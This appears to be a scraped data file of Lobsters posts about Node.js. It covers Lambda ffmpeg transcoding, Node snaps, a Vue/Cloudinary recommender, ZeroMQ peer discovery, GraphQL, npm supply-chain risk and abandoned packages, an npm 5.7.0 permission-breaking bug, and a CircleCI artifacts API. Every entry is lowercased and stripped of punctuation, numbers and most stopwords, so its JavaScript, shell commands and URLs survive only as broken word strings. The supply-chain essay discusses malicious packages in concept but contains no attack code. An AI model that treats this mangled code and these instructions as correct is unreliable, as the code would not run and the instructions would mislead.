pas argument transcode input file upload file using parameter upload output ffmpeg using logkey parameter delete temporary file case container reused future invocation overall logic actually pretty simple think complexity putting together function like really lie bundling ffmpeg saw extremely helpful put together actual lambda handler add following code file called transcoderjs directory ran exodus yarn earlier const childprocess require childprocess const f require f const path require path const aws require awssdk const request require request const tempy require tempy const new exportshandler event context callback going transcoding asynchronously callback immediately callback extract event parameter const url event const filename eventfilename pathbasename const logkey eventlogkey log const create temporary inputoutput filename clean afterwards const inputfilename tempyfile const tempyfile extension download source file promiseresolve new promise resolve revoke const writestream fscreatewritestream inputfilename writestreamon finish resolve writestreamon error revoke request url pipe writestream perform actual transcoding use exodus ffmpeg bundled executable const ffmpeg pathresolve dirname exodus bin ffmpeg convert flv file file using ffmpeg const ffmpegargs inputfilename vn disable video stream output acodec use lame encoding ac set audio channel q set quality roughly kb const process childprocessspawnsync ffmpeg ffmpegargs return processstdouttostring processstderrtostring upload generated logcontent new promise resolve revoke body fscreatereadstream bucket key contentdisposition attachment filename filenamereplace contenttype audiompeg error error revoke error else update log ffmpeg output const logfilename pathbasename logkey body logcontent bucket contenttype textplain contentdisposition inline filename logfilenamereplace key logkey resolve catch consoleerror delete temporary file inputfilename foreach filename fsexistssync filename fsunlinksync filename see transcoding option determined argument pas ffmpeg child process hardcoded produce file function designed used youtube downloader could easily adapt code use different output format even accept codec detail parameter invocation event need package lambda function zip file order deploy code annoying thing aws commandline tool often timeout uploading large zip file lambda workaround first upload zip file specify bucket key rather local file path problem update function code create new one make sure initial function creation succeeds initially create minimal zip file contain dependency actually run without dependency file upload quickly considered valid lambda wo nt run without dependency upload quickly zip transcoderjs use aws lambda createfunction actually create lambda function one thing note specifying timeout second maximum timeout lambda function essentially determines maximum video length transcoder able handle something take longer minute download transcode upload function fail silently maximum video length work around minute practice converting youtube video store function name later export transcoderfunctionname create transcoder function aws lambda createfunction functionname transcoderfunctionname zipfile fileb handler transcoderhandler runtime timeout role rolearn echo additional detail function created functionname functionarn arn aws lambda function runtime role arn aws iam handler transcoderhandler codesize description timeout memorysize lastmodified version latest tracingconfig mode passthrough revisionid see memory size allocated function mb default value function turn right transcoding task tend cap around mb peak usage created function use workaround include dependency function dependency need add zip file package nodemodules ffmpeg bundle exodus upload full function bundle using aws cp update function using aws lambda updatefunctioncode create zip file dependency rm f zip symlinks recursepaths transcoderjs packagejson nodemodules upload zip file aws cp bucketname update function using zip file code source aws lambda updatefunctioncode functionname transcoderfunctionname bucketname take little finish file upload transcoding function good go let test using input file eversocharming wavsourcecom love motto ever said love wavs come right place use download url wav site construct event object pas lambda function chose humphrey bogart quite caine mutiny constructed following event read r transcoderevent eof logkey flyrightlog bucketname url http eof use aws lambda invoke command invoke transcoder function test event invoke transcoder function test event aws lambda invoke functionname transcoderfunctionname payload transcoderevent devnull even though lambda function designed asynchronous default invocation type requestresponse actually wait lambda function completely terminate returning mean converted corresponding log file available soon command finish running check run following command download file download play converted aws cp bucketname mplayer display log output aws cp bucketname flyrightlog log output look something like ffmpeg version copyright c ffmpeg developer built gcc gcc configuration prefixusr disabledebug disablestatic disablestripping enableavisynth enableavresample enablefontconfig enablegmp enablegnutls enablegpl enableladspa enablelibass enablelibbluray enablelibfreetype enablelibfribidi enablelibgsm enablelibmodplug enablelibopencoreamrnb enablelibopencoreamrwb enablelibopenjpeg enablelibopus enablelibpulse enablelibsoxr enablelibspeex enablelibssh enablelibtheora enablelibvidstab enablelibvorbis enablelibvpx enablelibwebp enablelibxcb enablelibxvid enableshared enableomx libavutil libavcodec libavformat libavdevice libavfilter libavresample libswscale libswresample libpostproc invalid return value stream protocol last message repeated time guessed channel layout input stream mono input wav duration bitrate kb stream audio hz mono kb stream mapping stream native press q stop help output metadata tsse stream audio hz stereo metadata encoder invalid return value stream protocol size bitrate global muxing overhead pretty typical ffmpeg output see version configuration information ffmpeg build using format filename input output file detail encoding process probably interesting thing note speed give u idea maximum length audio could encode single lambda invocation ignore time downloading uploading maximum audio length could encode would time minute minute something like absolute upper bound function would able downloadupload time subtract would decoding need take place source file wav file intermissionconclusion far covered process bundling ffmpeg exodus building basic medium transcoding function aws lambda also done backoftheenvelope calculation show extremely cost effective alternative aws elastic transcoder dealing transcoding task processed within minute limit lambda function invocation next part series making youtube downloader exodus ffmpeg aws lambda jump building practical youtube downloader service build upon transcoding function developed interested checking great content intoli feel free browse article blog subscribe monthly article newsletter also star follow intoliarticlematerials repository github find new article often even published
213,Lobsters,nodejs,Node.js programming,Installing Node.js Tutorial: Using snaps on Linux,http://nodesource.com/blog/installing-nodejs-tutorial-using-snaps-on-linux/,installing nodejs tutorial using snap linux,snap tl dr show install snapd quick guide step install snapd snapd snapd step install stable version nodejs step confirm installation step updating versioning autoupdating channel note deployment nodesource linux distribution running nodejs application systemd work bleedingedge nodejs git repository little snap advanced snap usage snap store vscode atom slack spotify github one last thing best practice operationalizing nodejs,share snap containerized software package designed work across cloud desktop iot device work natively popular linux distribution feature automatic update user improved security greater flexibility developer working linux environment autoupdating transactional nature making snap popular choice delivery desktop application particular nodejs snap contains nodejs runtime along two widelyused package manager npm yarn single command developer running chosen version nodejs supporting tool need external repos personal package archive ppas tl dr show install using linux distribution already snapd installed ubuntu later simply run sudo snap install node classic install recent lts version nodejs carbon quick guide step install snapd snapd service run manages snap including performing automatic update installation instruction supported versioning information following linux distribution found supported linux distribution snapd arch linux debian fedora linux mint manjaro openembeddedyocto openwrt solus ubuntu step install stable version nodejs install nodejs carbon recent lts version run sudo snap install node classic classic argument required nodejs need full access system order useful therefore need snap classic confinement default snap much restricted ability access disk network must request special access need since must select nodejs major version eg must supply channel argument without snap know version nodejs wantto make sure disruptive change automatically installed new major version node publishing unversioned nodejs snap store step confirm installation run following command make sure node available system node v also find npm yarn system npm v yarn v step updating versioning snap autoupdating normally new nodejs installed day release nodejsorg different nodejs version live different channel nodejs channel name majorversion number nodejs switch nodejs channel refresh command take channel argument example switch nodejs run sudo snap refresh node note deployment due autoupdating nature snap necessarily appropriate deployment nodejs application production nodesource recommends stable integrationtested deployment pipeline enterprise application nodesource linux distribution ideal source stable nodejs binary however snap represent excellent way keep developer machine updated allow trivial convenient switching nodejs version ready unleash app production read next running nodejs application systemd work bleedingedge nodejs user feeling adventurous interested testing latest code nodejs core developer install edge channel element risk direct pipeline upstream nodejs git repository snap store preview ongoing nodejs development work recommend user willing participate testing bug reporting upstream sudo snap install node classic channeledge little snap snap fancy new linux package format fact even intended replace traditional role apt yum dnf pkg friend sophisticated way safely deliver complex application almost flavor linux desktop find snap security feature transaction much start man snap read canonical advanced snap usage tutorial also plenty additional snap linux desktop available snap store vscode atom slack spotify let u know think nodejs snap github one last thing nodejs distinguished one fastest application platform available one lowest barrier entry onboarding new existing team whether modernizing legacy system aiming leverage performant scalable solution right gate nodejs proven efficient scalable project company size check recent white paper best practice operationalizing nodejs holistic view take securely performantly scale nodejs application
214,Lobsters,nodejs,Node.js programming,Create A YouTube-style Recommendation Engine With Node & Vue,https://vuejsdevelopers.com/2018/04/16/video-vue-node-cloudinary/,create youtubestyle recommendation engine node vue,method learn dependency node vue step getting set cloudinary cloudinary creating cloudinary account link dashboard enable automatic video tagging addon register free tier edit restricted image type security step building backend server install required node module create theserverjs file import node module create express app load middlewares configure cloudinary client dashboard create app route configure application port ready vue privacy policy step building frontend vue installing vue installing node module creating upload component creating playlist component cloudinary video player importing component appvue conclusion github,one best way hook user app show personalized content good example youtube video suggestion based previously watched video another popular one amazon suggestion view similar item based previously viewed product another example instagram method choosing image video show search explorewhat learnin article walk step building simple application suggests personalized video user based video user recently uploaded user uploads video return get feed related video going take advantage cloudinary video player automatic video tagging addon powered googleyour finished app look something like dependenciesto build app going use node server backend vue frontend perform tutorial verify node installed machinenode package manager npm installed machineto verify installation run command terminal node version npm version get version number result follow along tutorial otherwise go ahead install read along see done itstep getting set cloudinarycloudinary onestopshop image video management including manipulation optimization delivery cloudinary save extra hour would spent developing kind functionality related manipulating delivering video appcreating cloudinary account follow link sign uponce successfully signed cloudinary redirected dashboard see cloudname apikey apisecret need value later tutorialenable automatic video tagging addonnow add automatic video tagging addon account go ahead register free tier allows use addon going step edit restricted image typesto allow cloudinary client query medium account different tag need ensure resource list option unchecked restricted image type security tab cloudinary account left checked able query medium library video tagsstep building backend serverto handle api call cloudinary using express serverinstall required node moduleswe need following node module cors enable crossorigin resource sharing appexpress web serverbodyparser used parse content json requestsconnectmultiparty enable multipart request appcloudinarycore javascriptcore package handle cloudinary functionsmake new directory change directory mkdir videosuggestion cd videosuggestion install node module npm install cors express bodyparser connectmultiparty cloudinarycore create theserverjs filenow need create file contain instruction needed server work videosuggestion directory touch serverjs startup file reference server running serverjs file need import node module installed import node module const cors require cors const express require express const cloudinary require cloudinarycore const bodyparser require bodyparser const multipart require connectmultiparty create express appnow let create express app adding following serverjs const app express load middlewareswe load middlewares serverjs adding following appuse cors appuse bodyparserjson appuse bodyparserurlencoded extended false const multipartmiddleware multipart command set app use cors also instruct app parse request json formatconfigure cloudinary clientnow need configure cloudinary client using cloudname apikey apisecret find value dashboard log cloudinary account cloudinaryconfig cloudname cloudinarycloudname apikey cloudinaryapikey apisecret cloudinaryapisecret create app routesour app two basic route upload upload user videosuggest fetch category video user interested infor upload part app use cloudinary client video sent u part post request call made upload route application sends video cloudinary medium libraryin upload command also include googlevideotagging category trigger autotagging feature store detected tag together video medium library apppost upload multipartmiddleware function req re upload video cloudinary cloudinaryuploaderupload reqfilesvideopath function result return resjson status true resourcetype video categorization googlevideotagging autotagging autotagging represents degree confidence used detected tagsto get detected tag video user uploaded use cloudinary client fetch tag resourcetype video appget suggest multipartmiddleware function req re resourcetype video function error result return resjson result configure application portand finish backend server setting port want app listen let port processenvport applisten port function consolelog app listening port port ready vue join free fourpart email course learn key change vue need aware subscription also includes vuejs developer promotional email optout time view privacy policy step building frontendnow backend application need build userfacing side application going use vue vue progressive javascript framework quick easy useinstalling vueif already vue installed confirm installation running vue version install vue cli running npm install global vuecli create frontend server run following videosuggestion directory created previous step vue init webpack frontend installing node moduleswe going use axios make get request one vue component nt need install well running following frontend directory cd frontend npm install axios creating upload componentnow want create upload component responsible uploading video cd frontendsrccomponents touch uploadvue uploadvue need import axios module script import axios axios describe component export default name upload data return video null loading method upload function file thisloading video detected thisvideo file onsubmit function compile form data const formdata new formdata formdataappend video thisvideo thisloading uploading please wait axiospost http formdata re thisloading upload complete script component two method upload onsubmit upload method assigns uploaded video thisvideo onsubmit method add video formdata sends post request upload route backend serverthe component template look like template div class container style div class row form class forminline enctype multipartformdata submitprevent onsubmit div class formgroup label video ampnbsp ampnbsp ampnbsp label input type file class formcontrol accept video name video von change upload eventtargetfiles div div class formgroup style marginleft button class btn btnprimary upload button loading div form div div template creating playlist componentnow video uploaded want offer user playlist similar video use cloudinary video player link href http unpkgcomcloudinaryvideoplayerdistcldvideoplayermincss rel stylesheet script src http unpkgcomcloudinarycorecloudinarycoreshrinkwrapminjs type textjavascript script script src http unpkgcomcloudinaryvideoplayerdistcldvideoplayerminjs type textjavascript script import video player styling javascript need laternow create playlist component cd frontendsrccomponents touch playlistvue playlistvue import axios module script import axios axios describe component export default name playlist data return interest loading mounted function get tag video uploaded user axiosget http result get ideally json info thisinterests resultdatatags let cld cloudinarycloudinarynew cloudname demo let demoplayer cldvideoplayer videoplayer demoplayerplaylistbytag resultdatatags autoadvance repeat true presentupcoming script component mounted make get request suggest route server return u list tag play video resource first tag using cloudinary videoplayer playlistbytag functionthe component template look like template div class container suggestion class header suggested video playist p em result based video uploads em p div class videoarea contain video player interest template vfor interest interest interest ampnbsp template video id videoplayer control class cldvideoplayer cldvideoplayerskindark video div div template scoped cs styling http githubcomchristiannwambavideosuggestionblobmasterfrontendsrccomponentsplaylistvue importing component appvuenow component ready import appvue captured view compiled script import upload componentsupload import playlist componentsplaylist export default name app component upload playlist script template appvue look like template div id app img src assetsvideopng width upload playlist div template see upload playlist template used hereonce done frontend server ready run using command npm run dev conclusionwe seen build video suggestion app using cloudinary vuejs view complete source code githubthere course many scenario use capture data content uploaded user order give personalized experience application tutorial touch tip iceberg potentialwe love hear way using data personalize content let u know comment
215,Lobsters,nodejs,Node.js programming,A Naïve Peer Discovery Implementation with Node.js and ZeroMQ,https://nrempel.com/posts/peer-discovery-with-nodejs-zeromq/,naïve peer discovery implementation nodejs zeromq,thinking building simple blockchain implementation use udp multicast zeromq http githubcomnrempelnaivepeerdiscovery,recently thinking building simple blockchain implementationto better understand pattern blockchain system distributed first challenge came mind allow peer network discover oneanother ultimate goal exercise keep thing simple possible first thought use udp multicast peer discovery essence every node would simply emits state multicast group every nseconds udp multicast simplest approach unfortunately work internet since network provider handle udp multicast packetsthe next logical step attempt enable peer discovery network use robust protocol opted use zeromq still socket oriented feature rich support smart pattern like publish subscribefor implementation many similarity udp multicast approach every node network periodically emits location known peer new node listens emission able discover known node begin emitting state effect joining networklet take look simple implementation pattern using nodejs zeromqconst process require process const zmq require zeromq const discoveryaddress tcp const messageaddress tcp const topicdiscovery const topicmessage two known port communication port used transmitting peer location port transmitting message also known topic use distinguish message typesconst node const args processargvslice nodespush processenv hostname args every node know hostname listens update every node must also given hostname least one valid node giving node location another node listen update network join network itselfconst discoverypublisher zmqsocket pub const messagepublisher zmqsocket pub const subscriber zmqsocket sub create socket context socket bind multiple port example avoid receiving duplicate message use two socket publishing information separate topic one socket listening everythingfunction sendmessageupdate const message bufferfrom ping host processenv hostname consoleinfo sending message message messagepublishersend topicmessage message function senddiscoveryupdate const message bufferfrom nodesjoin consoleinfo sending discovery update message discoverypublishersend topicdiscovery message couple function handle publishing data two socket two topic function called interval later onfunction handlediscoverytopic message consoleinfo discovery update received message const messagestring string message node messagestringsplit nodesforeach node nodesincludes node return nodespush node subscriberconnect tcp node subscriberconnect tcp node function handlemessagetopic message consoleinfo message received message two function handle incoming message two topic message handler quite simple print message received console discovery topic handler exists take message containing list known peer another peer update list known peer node current peer update list peer node receive update well effect change list peer propagate networksubscriberon message function topic message const topicstring string topic switch topicstring case topicdiscovery handlediscoverytopic message break case topicmessage handlemessagetopic message break default consolewarn unknown topic topic dropping message break subscriber socket listens message event call relevant function datadiscoverypublisherbindsync discoveryaddress messagepublisherbindsync messageaddress nodesforeach node subscriberconnect tcp node subscriberconnect tcp node subscribersubscribe topicmessage subscribersubscribe topicdiscovery bind publisher context relevant address connect subscribe subscriber socket initially known peer must least one consolelog tcp socket listening hostname processenv hostname setinterval consolelog sendmessageupdate senddiscoveryupdate consolelog finally kick node start sending update every secondshere full code snippet glory const process require process const zmq require zeromq const discoveryaddress tcp const messageaddress tcp keep track peer including hostname const node const args processargvslice nodespush processenv hostname args const topicdiscovery const topicmessage u different socket different message type otherwise get duplicate message const discoverypublisher zmqsocket pub const messagepublisher zmqsocket pub const subscriber zmqsocket sub send simple message function sendmessageupdate const message bufferfrom ping host processenv hostname consoleinfo sending message message messagepublishersend topicmessage message send known peer function senddiscoveryupdate const message bufferfrom nodesjoin consoleinfo sending discovery update message discoverypublishersend topicdiscovery message update list known peer connect knew one get discovery topic message function handlediscoverytopic message consoleinfo discovery update received message const messagestring string message node messagestringsplit nodesforeach node nodesincludes node return nodespush node subscriberconnect tcp node subscriberconnect tcp node handle simple message topic message function handlemessagetopic message consoleinfo message received message listen message socket call function related topic subscriberon message function topic message const topicstring string topic switch topicstring case topicdiscovery handlediscoverytopic message break case topicmessage handlemessagetopic message break default consolewarn unknown topic topic dropping message break discoverypublisherbindsync discoveryaddress messagepublisherbindsync messageaddress connect initially known node nodesforeach node subscriberconnect tcp node subscriberconnect tcp node subscribersubscribe topicmessage subscribersubscribe topicdiscovery consolelog tcp socket listening hostname processenv hostname start sending message every setinterval consolelog sendmessageupdate senddiscoveryupdate consolelog since reusing port keep logic simple decided use docker dockercompose create node network want run code see full example follow along http githubcomnrempelnaivepeerdiscoverytake note dockercompose file version service build command node discoveryjs environment hostname build command node discoveryjs environment hostname build command node discoveryjs environment hostname build command node discoveryjs environment hostname initially passed location given location pattern continues see full circuit examine node graph since every node publishes known peer running node effect node discovering node network allowing state propagatewe run node verify true dockercompose grep tcp socket listening hostname sending message ping host sending discovery update message received ping host discovery update received message received ping host discovery update received message received ping host discovery update received sending message ping host sending discovery update message received ping host discovery update received message received ping host discovery update received message received ping host discovery update received message received ping host discovery update received see first discovery update sends sending hostname provided subsequently receives update quickly also receives discovery update another node contains location node second interval know location node network begin listening node message also publishing list host name others see inspected log verify true processesi would call success fairly simple pattern peer discovery minimal overheadthere still question caveat node easily added network way never removed add heuristic ignore failing node mean node start failing node add blacklist even failing node recovers may never able rejoin network additionally problem node add number peer network free could performance consequence especially bad actor wanted take network since exploring blockchain implementation perhaps list peer could written ledgeri continue consider problem explore solution
217,Lobsters,nodejs,Node.js programming,Starting with GraphQL: Caveats — Part 1,http://www.oscarfunes.com/2018/04/03/graphql-part-one/,starting graphql caveat part,documentation video spec authentication authorization configuration relay specification caching default apolloclient client caching rest json api ion hypermedia type conclusion,query language api serverside runtime executing query using type system define data recently started play graphql interact different microservices available company work going documentation video spec sure interesting technology work especially fit trying achieve aggregating different resource create specific payload current frontend client web mobile special graphql new way request json backend without worrying much response get asked essence take look hello world would write query client response would obtain data hello hello world reality tying together complicated application hello world thing take notice immersing building thing graphql team left userland implement think make sense since make statement query language mean protocol exchanging data authentication authorization probably already using method authenticatingauthorizing user within system reuse graphql client nodejs allow dynamically create graphql configuration per request example expressgraphql appuse graphql graphqlhttp async request response graphqlparams schema mygraphqlschema rootvalue await somefunctiontogetrootvalue request graphiql true previously defined preferred method authentication like oauth jwt cooky etc previous middleware authentication pas credential check resolver user authorized pagination facebook prefers using cursor specified relay specification community check relay default checking thing outside scope problem relay enforces query return cursor information like user id name friend first opaquecursor edge cursor node id name pageinfo hasnextpage let go bit first argument many show starting beginning list example first ten element list case list friend wrapper real friend list friend contains edge another list wrap friend node field make available field access user edge cursor id later refer pageinfo container metadata case know end list think facebook prefers cursor better fit infinite scroll experience offer application principle implement pagination however see fit often see people referring relay best practice around graphql caching caching sensitive subject httprestful advocate hood way send query post cacheable default curl xpost http h contenttype applicationgraphql query root hello response method cacheable unless response includes appropriate cachecontrol expires header field let look first caching client side think one popular client apolloclient implement effective caching strategy general idea cache graph like request query graph path likely requesting data get cache request go interesting form caching caching node since think data graph response query come back node id assigned way even make different query reference node get node cache allows mutation response come reference id update client cache per previous statement relay also excellent information around client caching essence work similar apolloclient idea caching graph rest think discussion happen maybe place used achieve benefit even say advantage caching http layer seen people argue json api good better using graphql also ion hypermedia type probably inside company standard dealing rest service something think highlight advantage graphql rest infinite way define api strongly typed query response match query like designed api later decide add hateoas metadata previously mentioned design spec benefit appendonly strategy provides breaking change going forward limit payload size grow infinitely without client noticing response time increase inadvertently conclusion agree graphql drawback benefit specifically benefit organization need stitch together downstream service frontend client create interface match data better way especially think data hierarchical default benefit modeling relationship single query using graphql already problem thing mentioned previously please let know comment
218,Lobsters,nodejs,Node.js programming,The Node.js Ecosystem Is Chaos,https://medium.com/@caspervonb/the-internet-is-at-the-mercy-of-a-handful-of-people-73fac4bc5068,nodejs ecosystem chaos,nodejs ecosystem chaotic insecure azer koçulu pulling package still code per day var function return responsible massive tl dr,nodejs ecosystem chaotic insecurea modern web developer workit seems like yesterday leftpad fiasco azer koçulu ended pulling package name disputeit really dangerous code deleted broke build everyone noticed build process whole ordeal lasted like two hoursit dangerous small redundant package one would ever actually bother audit deploying anyone could jumped published package place functionality also stick malicious code get free ride get deployed essentially anywhere ran javascriptwell sure good thing learned lesson still codewhen leftpad hit developer camp laugh tiny piece code could module good thing learned right well allthe following wonder engineering aptly named isodd around downloads per daygoing dependent tree found hundred project depending importantly also big player including webpack browsersync babel depend itbasically mean package trojan waiting baitandswitch minor patch could theoretically inject code developer machine also inject code generation whatever prepreprocessors available via require including babel webpacknow lot power give package single modulus bitwise operator callbut surely freak occurrence right actually common practice today repeat mantra taken bit literally many consider even writing basic one liner reinventing wheelthe isnumber package nearly two million downloads per day isodddepends packagemy personal favorite iseven package using negation operator also reinventing wheel var isodd require isodd moduleexports function iseven return isodd fair author maintainer glorious package mentioned earlier problem applies package package repository thousand similarly trivial package hundred known completely unknown anonymous author popular million downloads per week indirectly depended upon many popular projectsbe responsibleit simple trust package manager every dependency written random developer somewhere world potential attack vector applies package manager one liner package make effort requiredall take one single maintainer wait reach wide enough release patch malicious payload spread like wildfire one actually look lock dependency like isstring patch versionis paranoid perhaps maybe healthy amount considering massive reach trivial package havethere already bunch browser extension injected cryptocurrency miner using bait switch strategy supposedly reviewed humansthere lack smart people trying spread malware begs question would anyone looking something malicious bother work involved finding crosssite scripting exploit create rubbish package zero effort release let developer spread aroundat point seems fairly probable best case scenario cryptocurrency miner currently living npm package repository already running developer machine server even client machine web electron application could also worse actual nefarious malware mining sensitive datatl drnode module widespread ripe abusenonsense dependency hard near impossible manually audit due sheer number themmanually audit lock dependenciesstop using nonsense dependency writing basic code reinventing wheel
219,Lobsters,nodejs,Node.js programming,Announcing a Node.js Snap for Linux,http://nodesource.com/blog/announcing-node-js-snap-linux-users/,announcing nodejs snap linux,comprehensive set linux package channel git repository,share nodesource excited announce popular open source crossplatform javascript runtime easier ever install linux thanks collaboration canonical snap software distribution system snap containerized software package designed work across cloud desktop iot device work natively popular linux distribution feature automatic update user improved security greater flexibility developer working linux environment autoupdating transactional nature making snap popular choice delivery desktop application particular nodejs snap contains nodejs runtime along widelyused package manager npm single command developer running chosen version nodejs supporting tool need external repos personal package archive ppas nodesource already actively maintains wildly popular comprehensive set linux package modern linux distribution across actively supported version nodejs extending build system include snap able deliver nodejs fresh linux system within hour minute formal release nodejs project many convenient form nodesource engineer leveraged channel feature snap store setting nodejs snap enabling u multiple release nodejs concurrently available store running separate track user nodejs snap select track follow confident automatically upgraded another major release installing nodejs snap easy sudo snap install node classic effortlessly switch nodejs channel time sudo snap switch node sudo snap refresh user feeling adventurous interested testing bleedingedge version nodejs install latest edge channel element risk direct pipeline upstream nodejs git repository snap store preview ongoing nodejs development work recommend user willing participate testing bug reporting upstream sudo snap install node classic channeledge please aware due autoupdating nature snap necessarily appropriate deployment nodejs application production nodesource recommends stable integrationtested deployment pipeline enterprise application however snap represent excellent way keep developer machine updated allow trivial convenient switching nodejs version
220,Lobsters,nodejs,Node.js programming,Adding Websocket support to core · nodejs/node,https://github.com/nodejs/node/issues/19308,adding websocket support core nodejsnode,join github today sign,dismiss join github today github home million developer working together host review code manage project build software together sign
221,Lobsters,nodejs,Node.js programming,Dawn of the Dead Packages,https://www.react-reveal.com/blog/npm/,dawn dead package,dawn dead package npmjscom update curious case missing package react reveal github npm thing starting get interesting aha moment case jqueryuinpm case pngasync case jquerycookie case gulpbatchreplace conclusion,dawn dead packagesif used npmjscom website look npm package past year might abandoned outdated unmaintained zombie package packagejson read full story updated event unfoldupdate npm seems fixed issue described curious case missing packagei author react animation library called react reveal like many project publishing github npm star github hundred daily downloads npm several year nowperhaps like many package maintainer became addicted checking download counter npm page often go npmjsorg website type react reveal search box click would able finally see counter suppose one little guilty pleasuresthen one day could nt find package strange thought offend npm somehow remembered added keywords packagejson animation effect name last release much npm considered spammer thing starting get interestingi quickly reverted change lo behold back top search result guess learn something new every day something still felt wrong could oh yeah type exact name package reactreveal search bar top hit old unrelated package abandoned year ago even sure doesin fact package nowhere found list suggestion update curiously made come back publishing time suggestion kind old unrelated package seemed dead long time kind digital package graveyard thing grew even stranger even typing exact name package search bar pressing enter sometimes would still taken abandoned package haunted ghost dead package time investigatethe aha momentafter couple try became clear hovered anywhere auto suggestion box moved mouse outside suggesting box highlight would disappear even clicked back input pressed enter search button would take package hovering last would take dead package page matter search boxwell tough luck small project npm nt care reckoned perhaps feel even miserable search well known package see suggestion would offered surely work say npm itselfexpress react gulp npm suggestion old dead package abandoned year ago sometimes completely unrelated even worse flick mouse suggestion disbelief say npm ca nt find would taken straight dead package page even nt click suggestion clicked back input pressed enterwell npmjs user smart lot nt would nt fall thing would never confuse dead package real thing contrary download counter old package huge pretty much every regularly maintained package haunted ghost clearly lot folk falling let look casescase jqueryuinpm top suggestion npm site package called jqueryuinpm sort difficult confuse npm jqueryuinpm even nt readme last released july perhaps confused jqueryui npm package seems maintained package official release jqueryui looking graph clearly see starting october thing picked steam jqueryuinpmcase pngasyncpngasync miserable download stats maintained thing markedly improved since final release september perhaps something top suggestion async search termcase jquerycookiejquerycookie longer maintained superseded jscookie three year ago latest release may odds great either jquery becoming massively popular likely jquerycookie top suggestion jscookie maintained package case gulpbatchreplacethe top suggestion gulpreplace gulp gulpbatchreplace fork gulp plugin called gulpreplace gulpreplace useful plugin example reactreveal using gulpbatchreplace intent purpose dead fork one release february issue nt answered pull request left untouched nt updated since publishing date unlike gulpreplace far downloads concerned really great look following statistic conclusioni think quite clear lot project old abandoned package dependency package would never receive update even critical vulnerability costing npm user wasted bandwidth lost productivity kind digital zombie alive point put rest author finally resurrected digital grave npm autosuggestthese living dead package could quietly hiding dark corner packagejson never receive update named confusingly similar living package never attract attention themselvesit seems root cause unfortunate situation following chain flaw npmjscom website search field autofocused therefore user take one hand keyboard place mouse select search field awkwardly start typing search term handautosuggestion algorithm strange tendency favour package longer receiving updatesthe final flaw need hover wrong suggestion taken page quite natural hover one hand mouse already seems create feedback loop training algorithm amplifies initial erroneous guessi think massive issue critical piece internet infrastructure npm become please share repost tweet spread word story would get fixed soon possible longer term zombie package identified npm user made aware issue especially zombie package dependency might gargantuan task necessary one npm ecosystem remain healthy
222,Lobsters,nodejs,Node.js programming,Critical Linux filesystem permissions are being changed by NPM 5.7.0,https://github.com/npm/npm/issues/19883,critical linux filesystem permission changed npm,opening issue going wrong cli team reproduce problem supporting information,opening issue going wrong issue happening ever since released hour ago seems completely broken filesystem permission caused manually fix permission critical file folder believe related commit traversing running chown wrong often critical filesystem file folder running sudo npm nonroot user root user effect filesystem permission heavily modified example run sudo npm help sudo npm update g command cause filesystem change ownership directory etc usr boot directory needed running system appears ownership recursively changed user currently running npm found selection directory owned nonroot user running sudo npm many binary usrbin stopped working permission changed people experiencing bug likely fully reinstall system due update npm update g root output package date likely still cause chown run silently root root drwxrxrx root root feb usr su jared nonroot user sudo npm update g jared sometimes eacces eperm output almost always corrupts filesystem drwxrxrx jared jared feb usr usr directory claimed npm ownership set jared jared shown thing happens directory seemingly random whilst traversed give sudo permission run npm alone see attempting traverse boot ownership crash fails given sudo say chown instead scandir output eacces instead error eperm operation permitted scandir bootinitramfslinuxfallbackimg typeerror read property get undefined error eacces operation permitted chown bootinitramfslinuxfallbackimg typeerror read property get undefined dangerous run latest version sudo feeling nt getting result cli team reproduce problem personally using arch linux latest npm package installed root user via pacman sy npm nodejs npm install g npm npm install g semver ensure npm version nonroot user sudo prefix sudo npm help find fails sometimes warning sometimes eacces unable chown file boot readonly directory log file generated system throw output console occurring system recent update using resolve issue entirely supporting information npm v print node v print npm config get registry print http registrynpmjsorg window o xmacos linux arch linux latest base network issue container
223,Lobsters,nodejs,Node.js programming,Extending CircleCI's API with a Custom Microservice on AWS Lambda,https://intoli.com/blog/circleci-artifacts/,extending circleci api custom microservice aws lambda,circleci docker support forum circleci documentation relevant thread enterprising young individual moderately successfuly open source project github amazon aws lambda nodejs express aws api gateway intoliarticlematerials intoli monthly newsletter writing express app circleci build artifact lambdifying express app handler function awsserverlessexpress creating aws role policy createrole jq amazon resource namearn putrolepolicy aws iam console aws commandline interface creating lambda function createfunction updatefunctioncode aws lambda console integrate function api gateway createrestapi getresources createresource greedy path variable putmethod putintegration createdeployment aws api gateway console page default url gateway deployment creating domain certificate aws certificate manager dns validation requestcertificate describecertificate aws acm console page exposing api domain name createdomainname createbasepathmapping api gateway console using api make coverage badge shieldsio jsonpath http circleciintolicomartifactsintoliexoduscoveragereportindexhtml done intoli mind future consulting contracting need,lot love circleci first continuous integration awesome general certainly develop fine software without good ci configuration really make life easier beyond circleci generous free tier provides four free container per open source project allows use custom docker image reasonably easy configure unfortunately also stuff love circleci big one support forum often feel like way user ask circleci responding fixing bug platform know sound pretty truth let take look specific example circleci concept build artifact file produced build get automatically uploaded typically might include compiled binary log file test coverage result etc open source project might want able link latest code coverage report download latest package recent version byproduct build unfortunately really possible circleci get wrong think supposed possible api mechanism accessing latest version build artifact according circleci documentation however accessing api endpoint always produce internal server error admittedly older version maybe removed functionality mention sort separate issue unresponsiveness support issue let take look excerpt relevant thread discussion forum reluctance implement really baffling seems like would simple implement virtually maintenance really useful many people jimfarrand bump really want link latest nightly run artifact project readme brandonpage give every time past month tethik would great could get input circleci employee moose moderator eventually chime nearly two year user commenting thread still solution enterprising young individual moderately successfuly open source project github supposed well turn circleci artifact api work get listing filename url latest build directly access latest version artifact single request would required link file create badge etc possible write small api endpoint fetch full listing latest build artifact circleci api find url latest version specific artifact return redirect url endpoint could hosted amazon aws lambda could serve lightweight microservice resolving latest version circleci build artifact article describe exactly first put together simple nodejs express app serve redirect latest version specified build artifact walk though process deploying lambda function aws providing access using aws api gateway able host aws would like intoli also providing generated api free charge open source project would like use simply link http circleciintolicomartifactsgithubusernamereponamepathtotheartifact serve redirect latest version file last passing build master branch code runinstructions article available intoliarticlematerials repository sure star watch repository want get notified latest content intoli great way keep date latest article traditionalist might prefer getting news old fashioned way intoli monthly newsletter enjoying article sign get monthly update best new content writing express app even think aws lambda need implement api would eventually like deploy use circleci build artifact endpoint get listing latest build artifact project following command intoli github username exodus name project github query string paramaters indicate would like artifact last passing build master branch curl http branchmaster filtersuccessful run get back array artifact look something like note removed response brevity path coveragereporttotalcoveragejson prettypath coveragereporttotalcoveragejson nodeindex url http etc bunch file removed response logic required microservice relatively straightforward listen artifact username project pathtofile get request parse optional query string parameter branch build filter vcstype default respectively set master latest successful github construct 